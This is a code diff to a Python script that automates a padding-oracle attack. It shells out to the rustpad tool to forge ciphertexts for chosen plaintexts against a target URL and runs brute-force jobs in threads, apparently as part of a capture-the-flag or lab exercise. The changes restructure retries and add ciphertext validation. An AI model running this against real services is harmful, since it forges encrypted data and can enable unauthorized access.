@@ -6,15 +6,9 @@ from threading import Thread
 
 def worker(job_number, from_thread=True):
     new_plaintext_append_number = re.sub(r"FUZZ", str(job_number), new_plaintext_append)
-    for i in range(0, 3):
-        encountered_error = False
-        try:
-            new_ciphertext = os.popen(f'./rustpad web --oracle "{url}" -D "0000000000000000" -E "{new_plaintext_append_number}" -B 8 --no-iv -t 10').read().strip()
-            break
-        except:
-            encountered_error = True
-        if encountered_error:
-            print(f"Retrying job {job_number} ({i+1}/3)")
+    new_ciphertext = os.popen(f'./rustpad web --oracle "{url}" -D "0000000000000000" -E "{new_plaintext_append_number}" -B 8 --no-iv -t 15').read().strip()
+    if re.match(r"[0-9a-f]{32}0{16}", new_ciphertext) is None:
+        raise Exception("Invalid ciphertext")
     start = len(new_ciphertext) - 48
     new_ciphertext = new_ciphertext[start:len(new_ciphertext)]
     ciphertext = ciphertext_base + new_ciphertext
@@ -26,6 +20,19 @@ def worker(job_number, from_thread=True):
             os._exit(0)
         else:
             return True
+
+def workerWrapper(job_number):
+    retVal = None
+    for i in range(0, 3):
+        encountered_error = False
+        try:
+            retVal = worker(job_number)
+            break
+        except:
+            encountered_error = True
+        if encountered_error:
+            print(f"Retrying job {job_number} ({i+1}/3)")
+    return retVal
 
 if __name__ == "__main__":
     if len(sys.argv) < 6:
@@ -58,7 +65,7 @@ if __name__ == "__main__":
     if job_end - job_start < 0:
         direction = -1
     for i in range(job_start, job_end, direction):
-        thread_arr.append(Thread(target=worker, args=(i,)))
+        thread_arr.append(Thread(target=workerWrapper, args=(i,)))
         if len(thread_arr) >= threads:
             print(f"Starting job {i - (threads-1)} - {i}")
             for thread in thread_arr:
